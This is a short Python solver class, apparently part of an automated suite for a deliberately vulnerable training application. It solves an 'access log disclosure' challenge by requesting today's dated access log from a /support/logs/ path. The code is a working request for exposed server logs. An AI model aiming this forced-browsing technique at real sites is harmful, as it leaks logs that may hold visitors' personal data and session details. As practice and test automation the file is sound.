from core.base_solver import BaseSolver
from datetime import datetime

class AccessLogSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "accessLogDisclosureChallenge"

    def solve(self) -> bool:
        # Access log filename format: access.log.YYYY-MM-DD
        today = datetime.now().strftime("%Y-%m-%d")
        filename = f"access.log.{today}"
        
        # Path is /support/logs/...
        url = f"/support/logs/{filename}"
        
        res = self.client.get(url)
        return res.status_code == 200
